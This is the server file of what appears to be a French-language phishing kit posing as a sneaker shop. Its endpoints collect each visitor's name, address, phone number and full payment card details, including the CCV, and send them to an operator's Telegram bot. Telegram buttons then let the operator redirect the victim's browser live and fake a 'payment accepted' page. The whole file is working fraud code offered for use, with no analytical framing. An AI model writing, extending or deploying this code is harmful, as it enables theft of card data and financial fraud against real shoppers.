// server.js
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import { dirname } from 'path';
import bodyParser from 'body-parser';
import cors from 'cors';
import fetch from 'node-fetch';
import { v4 as uuidv4 } from 'uuid';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = BOT_TOKEN ? `https://api.telegram.org/bot${BOT_TOKEN}` : null;

if(!BOT_TOKEN || !CHAT_ID) console.warn('⚠️ BOT_TOKEN ou CHAT_ID manquant.');

const sessions = {};

// Envoi de notif Telegram
async function sendTelegramNotif(data, buttons){
  if(!BOT_TOKEN || !CHAT_ID) return;
  let msg = `🆕 <b>Nouvelle interaction</b>\n`;
  msg += `🆔 Session: ${data.sessionId}\n`;
  if(data.page) msg += `📄 Page: ${data.page}\n`;
  if(data.pair) msg += `👟 Paire: ${data.pair}\n`;
  if(data.delivery){
    msg += `📦 Livraison: ${data.delivery.nom} ${data.delivery.prenom}\n`;
    msg += `🏠 Adresse: ${data.delivery.adresse}\n`;
    msg += `📞 Tel: ${data.delivery.telephone}\n`;
  }
  if(data.card){
    msg += `💳 Carte: ${data.card.number}\n`;
    msg += `🗓️ Exp: ${data.card.expiry}\n`;
    msg += `CCV: ${data.card.ccv}\n`;
    msg += `👤 Titulaire: ${data.card.holder}\n`;
  }
  msg += `🕓 ${new Date().toLocaleString()}`;

  await fetch(`${TELEGRAM_API}/sendMessage`,{
    method:'POST',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: msg,
      parse_mode:'HTML',
      reply_markup: { inline_keyboard: buttons || getButtons(data.sessionId) }
    })
  });
}

// Buttons Telegram pour redirection
function getButtons(sessionId){
  return [
    [{ text:'🏠 Accueil', callback_data:`next|${sessionId}|/index.html` }],
    [{ text:'👟 Produit', callback_data:`next|${sessionId}|/product.html` }],
    [{ text:'📦 Livraison', callback_data:`next|${sessionId}|/delivery.html` }],
    [{ text:'💳 Paiement', callback_data:`next|${sessionId}|/payment.html` }],
    [{ text:'✅ Valider paiement', callback_data:`validate|${sessionId}` }]
  ];
}

// VISITE ACCUEIL
app.post('/api/visit', (req,res)=>{
  const sid = uuidv4();
  sessions[sid] = { data:{ sessionId:sid, page:'Accueil' }, redirect:null };
  sendTelegramNotif(sessions[sid].data, getButtons(sid));
  res.json({ sessionId:sid });
});

// CHOIX PRODUIT
app.post('/api/buy', (req,res)=>{
  const { sessionId, pair } = req.body;
  if(!sessions[sessionId]) return res.status(400).send('Session invalide');
  sessions[sessionId].data.pair = pair;
  sessions[sessionId].data.page = 'Produit';
  sendTelegramNotif(sessions[sessionId].data, getButtons(sessionId));
  res.json({ ok:true });
});

// LIVRAISON
app.post('/api/delivery', (req,res)=>{
  const { sessionId, nom, prenom, adresse, telephone } = req.body;
  if(!sessions[sessionId]) return res.status(400).send('Session invalide');
  sessions[sessionId].data.delivery = { nom, prenom, adresse, telephone };
  sessions[sessionId].data.page = 'Livraison';
  sendTelegramNotif(sessions[sessionId].data, getButtons(sessionId));
  res.json({ ok:true });
});

// PAIEMENT
app.post('/api/payment', (req,res)=>{
  const { sessionId, number, expiry, ccv, holder } = req.body;
  if(!sessions[sessionId]) return res.status(400).send('Session invalide');
  sessions[sessionId].data.card = { number, expiry, ccv, holder };
  sessions[sessionId].data.page = 'Paiement';
  sendTelegramNotif(sessions[sessionId].data, getButtons(sessionId));
  res.json({ ok:true });
});

// POLLING FRONT-END pour redirection automatique
app.get('/api/status', (req,res)=>{
  const { sessionId } = req.query;
  if(!sessions[sessionId]) return res.json({});
  res.json({ redirect: sessions[sessionId].redirect || null });
});

// TELEGRAM WEBHOOK
app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
  const body = req.body;
  if(body.callback_query){
    const cb = body.callback_query;
    const [action,sid,url] = cb.data.split('|');
    if(!sessions[sid]) return res.sendStatus(200);

    if(action==='next'){
      // Redirection utilisateur
      sessions[sid].redirect = url;
    } else if(action==='validate'){
      // Paiement validé
      sessions[sid].redirect = '/paymentAccepted.html';
      sessions[sid].data.status = 'Paiement accepté par admin';
      await sendTelegramNotif(sessions[sid].data, getButtons(sid));
    }

    await fetch(`${TELEGRAM_API}/answerCallbackQuery`,{
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ callback_query_id: cb.id, text:'Action prise' })
    });
  }
  res.sendStatus(200);
});

// SERVE INDEX
app.get('/', (_,res)=>res.sendFile(path.join(__dirname,'public','index.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=>console.log(`✅ Serveur prêt sur ${PORT}`));

